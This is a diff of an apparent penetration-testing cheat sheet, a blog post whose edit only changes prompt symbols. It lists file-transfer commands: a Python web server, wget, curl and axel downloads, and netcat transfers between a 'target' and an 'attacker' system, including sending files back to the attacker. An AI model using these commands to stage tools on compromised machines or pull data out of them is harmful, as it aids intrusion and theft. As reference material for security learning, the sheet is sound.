@@ -10,24 +10,24 @@ layout: post
 ###### Start a webserver
 ```
 Python3
-> sudo python3 -m http.server 80
+$ sudo python3 -m http.server 80
 Python2
-> sudo python -m SimpleHTTPServer 80
+$ sudo python -m SimpleHTTPServer 80
 ```
 
 ###### Download from bash
 ```
-> wget 192.168.1.1:443/file.txt
-> curl 192.168.1.1:443/file.txt -o file.txt
-> axel 192.168.1.1:443/file.txt -o file.txt
+$ wget 192.168.1.1:443/file.txt
+$ curl 192.168.1.1:443/file.txt -o file.txt
+$ axel 192.168.1.1:443/file.txt -o file.txt
 ```
 
 ###### netcat
 ```
 On the target system:
-> nc -lvp 80 > file.txt
+$ nc -lvp 80 > file.txt
 On the attacker system:
-> nc 192.168.1.1 80 < file.txt
+$ nc 192.168.1.1 80 < file.txt
 
 Also works the other way, to get files back to the attacker system
 ```
